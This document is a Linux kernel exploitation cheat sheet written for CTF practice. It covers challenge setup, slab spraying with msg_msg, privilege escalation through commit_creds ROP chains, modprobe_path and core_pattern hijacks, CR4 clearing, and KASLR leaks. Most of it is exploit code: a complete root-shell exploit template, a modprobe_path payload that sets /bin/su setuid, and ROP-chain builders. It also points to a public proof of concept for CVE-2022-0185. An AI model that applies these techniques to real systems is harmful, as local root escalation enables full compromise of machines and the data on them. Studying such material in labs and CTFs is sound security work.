# Kernel pwn

## Prep

Typical kernel-challenge pack:

```text
kernel/
├── bzImage          # compressed kernel image
├── vmlinux          # uncompressed kernel (with symbols, for gdb)
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko          # vuln driver
├── run.sh           # qemu boot script
└── (.config)        # build config, optional
```

### Unpack initramfs and edit init

```bash
mkdir initramfs && cd initramfs
zcat ../initramfs.cpio.gz | cpio -idm
# or newc:
# cpio -idm < ../initramfs.cpio

# edit init for root (CTF learning; real challenges usually setuid 1000)
sed -i 's|setuidgid 1000|setuidgid 0|g' init
# or comment out the user-switch line

# repack
find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
cd ..
```

### Extract vmlinux (if only bzImage is given)

```bash
# extract-vmlinux (kernel source scripts/)
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### QEMU boot-arg template

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr quiet oops=panic panic=1" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -s    # gdb port 1234
```

Key flags vs exploit:

| Flag | Meaning | Exploit impact |
|------|---------|----------------|
| `+smep` | Kernel cannot execute userland code | MUST ROP; cannot jump to user shellcode |
| `+smap` | Kernel cannot access userland data | ROP chain cannot live in userland; put it in kernel (heap spray / msgsnd) |
| `+pku` | Protection Keys | like SMAP |
| `nokaslr` | Disable KASLR | function addresses fixed |
| `kaslr` | Enable KASLR | MUST leak |
| `pti=on` | KPTI (Meltdown fix) | return to userland needs swapgs_restore_regs_and_return_to_usermode |

### Debug

```bash
# terminal 1
./run.sh   # with -s

# terminal 2
gdb vmlinux
(gdb) target remote :1234
(gdb) b vulnerable_ioctl
(gdb) c
```

GEF: prefer bata24's fork; it pretty-prints kernel structs.

## Vuln-class split

| Vuln | Typical source | Exploit baseline |
|------|----------------|------------------|
| Kernel stack overflow | controllable copy_from_user length | stack canary + KASLR → ROP |
| Kernel heap overflow | kmalloc slab OOB write | slab spray + overwrite neighbor |
| UAF | refcount error / double free | re-alloc same slab → control freed object |
| Integer overflow | size wrap → small alloc, large copy | actually overflow; same as heap |
| TOCTOU | user pointer deref twice | userfaultfd / FUSE to stall |
| race | two threads ioctl together | pin the timing window |
| Arbitrary R/W | already the ultimate primitive | rewrite cred / modprobe_path |

## Slab spray (core of heap pwn)

Spray controllable-size kernel objects onto the vuln slab; overwrite the target.

| slab size | Spray object | Strength |
|-----------|--------------|----------|
| kmalloc-64 / 96 | `seq_operations` | has a function ptr; overwrite = IP |
| kmalloc-1024 | `tty_struct` | has ops ptr; clean struct |
| kmalloc-4096 | `pipe_buffer` | modern mainstay; still works on 6.x |
| any size | `msg_msg` | size controllable (8 - 4096+); sysv msgsnd controls data |
| kmalloc-128 | `user_key_payload` | keyctl family |

### msg_msg spray example

```c
// userland trigger
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct {
    long mtype;
    char mtext[0x80 - 0x30];  // plus msg_msg header 0x30 = kmalloc-128
} msg = { .mtype = 0x1337 };
memset(msg.mtext, 'A', sizeof(msg.mtext));

msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // spray into kmalloc-128
// ... trigger vuln overwrite
msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // read back; mutated? → leak
```

## Privesc paths

### 1. commit_creds(prepare_kernel_cred(0)) ROP

Classic and general. Prerequisite: RIP control (stack overflow / vtable hijack).

```c
// userland ROP chain
uint64_t rop[] = {
    pop_rdi,                          // pop rdi; ret
    0,                                // arg: 0
    prepare_kernel_cred,              // → root cred in rax
    pop_rdi,                          // pop rdi; ret
    /* placeholder, next mov overwrites */ 0,
    /* mov rdi, rax; ... ; ret */ 0,  // rax→rdi (some need a dedicated gadget)
    commit_creds,                     // current process cred = root
    swapgs_restore_regs_and_return_to_usermode + 22,  // skip the push sequence
    0, 0,                             // rax, rdi placeholders
    user_rip,                         // userland return (cs/ss saved)
    user_cs, user_rflags, user_rsp, user_ss,
};
```

**Key gadgets** (ROPgadget in vmlinux):

```bash
ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
```

Save cs/ss/rflags/rsp before returning to userland:

```c
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp));
}
void shell() { system("/bin/sh"); }
```

### 2. Rewrite modprobe_path to /tmp/x (cheapest)

```text
Idea:
  - kernel global modprobe_path defaults to "/sbin/modprobe"
  - on execve of unknown magic, kernel runs modprobe_path as root
  - rewrite to "/tmp/x", write /tmp/x (chmod +x), trigger unknown magic

Use: have arbitrary-write, not necessarily ROP
```

```c
// 1. payload
system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
system("chmod +x /tmp/x");

// 2. trigger file
system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
system("chmod +x /tmp/trigger");

// 3. vuln write: modprobe_path → "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. trigger
system("/tmp/trigger");
// kernel root runs /tmp/x, chmod +s /bin/su

// 5. use setuid
system("/bin/su");
```

**modprobe_path address**: symbol in vmlinux, or /proc/kallsyms (if kptr_restrict=0).

### 3. core_pattern hijack

```text
Same idea: /proc/sys/kernel/core_pattern controls the coredump handler
Rewrite to "|/tmp/x %P", invoked when a process crashes
Downside: needs a coredump; clumsier than modprobe_path
```

### 4. Kernel ROP to drop SMEP/SMAP

If you really want to jump to userland shellcode (learning), ROP-clear CR4 bits:

```c
// CR4: SMEP = bit 20, SMAP = bit 21
// after SMEP+SMAP off, jmp to user shellcode can run
uint64_t rop[] = {
    pop_rdi,
    0x6f0,                  // desired CR4 (SMEP/SMAP bits cleared)
    mov_cr4_rdi,            // "mov cr4, rdi; pop rbp; ret" or similar
    0,
    user_shellcode_addr,    // jump (fails if SMEP still on)
};
```

In real exploits **almost never this path** — commit_creds ROP is shorter and more stable.

## KASLR leak channels

| Source | Limit | Notes |
|--------|-------|-------|
| /proc/kallsyms | real addrs only if `kptr_restrict=0` | often open in CTF |
| /sys/module/.../sections/.text | same | module base |
| dmesg | readable if `dmesg_restrict=0` | oops leaks addresses |
| Uninit kernel-stack read | vuln itself must arbitrary-read | leftover addrs |
| msg_msg + vuln leak | spray then OOB read | general |
| Side channel (Meltdown/Spectre) | KPTI fixed Meltdown | not general |
| SIDT/SGDT userland insns | old kernels may leak | mostly closed now |

```c
// classic: read /proc/kallsyms
FILE *f = fopen("/proc/kallsyms", "r");
char line[256];
unsigned long commit_creds = 0;
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, " commit_creds")) {
        commit_creds = strtoul(line, NULL, 16);
        break;
    }
}
unsigned long kbase = commit_creds - 0xXXXXX;  // offset from vmlinux
```

## Full exploit template (userland + ioctl trigger + ROP privesc + shell)

```c
// exploit.c — generic kernel-pwn skeleton
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) {
        puts("[+] root!");
        system("/bin/sh");
    } else {
        puts("[-] not root");
    }
    exit(0);
}

// === KASLR base (leak first, or hardcode if nokaslr) ===
#define KBASE_DEFAULT  0xffffffff81000000UL
#define OFF_COMMIT_CREDS         0x0xxxxx
#define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
#define OFF_POP_RDI              0x0xxxxx
#define OFF_MOV_RDI_RAX          0x0xxxxx
#define OFF_SWAPGS_RESTORE       0x0xxxxx

int main(void) {
    save_state();

    // 1. leak KASLR base (assume /proc/kallsyms readable, or write a leak primitive)
    unsigned long kbase = leak_kbase();

    unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
    unsigned long commit_creds        = kbase + OFF_COMMIT_CREDS;
    unsigned long pop_rdi             = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
    unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;

    // 2. build ROP (user stack or sprayed fake stack)
    unsigned long *rop = mmap((void*)0x100000, 0x1000,
                              PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    int i = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore;
    rop[i++] = 0;  // rax
    rop[i++] = 0;  // rdi
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = (unsigned long)(rop + 100);  // temp user rsp, can point high in mmap
    rop[i++] = user_ss;

    // 3. trigger vuln so kernel RIP jumps to rop[0]
    int fd = open("/dev/vuln", O_RDWR);
    trigger(fd, rop);   // challenge-specific: ioctl / write / read

    return 0;
}
```

## Study sample: CVE-2022-0185

```text
Vuln: fs/fs_context.c legacy_parse_param signed/unsigned length mixup
      → kmalloc heap buffer overflow, size arbitrary, data arbitrary

Why a good study sample:
1. No root needed to trigger (unprivileged user namespace)
2. Overflow size fully controllable
3. Public full writeup + PoC
4. Combines: user_ns exploit, msg_msg spray, UAF reoccupy, cross-cache

Study path:
1. Build a kernel with CONFIG_USER_NS=y
2. Run Crusaders of Rust original PoC: https://www.openwall.com/lists/oss-security/2022/01/18/7
3. Read willsroot.io official writeup (PortSwigger-hosted version)
4. Rewrite by hand: swap msg_msg spray for pipe_buffer spray (practice another slab path)
5. Add KASLR leak (original uses /proc/kallsyms; challenge version disables it → OOB read)
```

Technique map to this doc:

- Vuln class → "kernel heap overflow"
- Spray object → "msg_msg spray"
- Privesc → "commit_creds ROP" or "modprobe_path"
- KASLR leak → "/proc/kallsyms" or "msg_msg + vuln leak"

## Notes

- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** randomizes kernel-stack base 0-1023 per syscall; breaks exploits that depend on a fixed stack offset
- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** randomizes in-slab object alloc; spray success drops — spray more
- **CONFIG_STATIC_USERMODEHELPER** makes modprobe_path a read-only `static_usermodehelper_path`; modprobe attack dies
- **KPTI** splits user/kernel page tables; return to userland MUST go through the `swapgs_restore_regs_and_return_to_usermode` trampoline, not raw swapgs+iretq
- **FG-KASLR** (function-granular KASLR) randomizes per function; leak several symbols to reverse each offset
- **CET / IBT** (Intel CFI) forces indirect jumps onto ENDBR; some gadgets die
- **Do not printk in kernel for tests** — serial IO changes timing and kills races; debug with a magic register (rcx=0xdeadbeef) + gdb watch
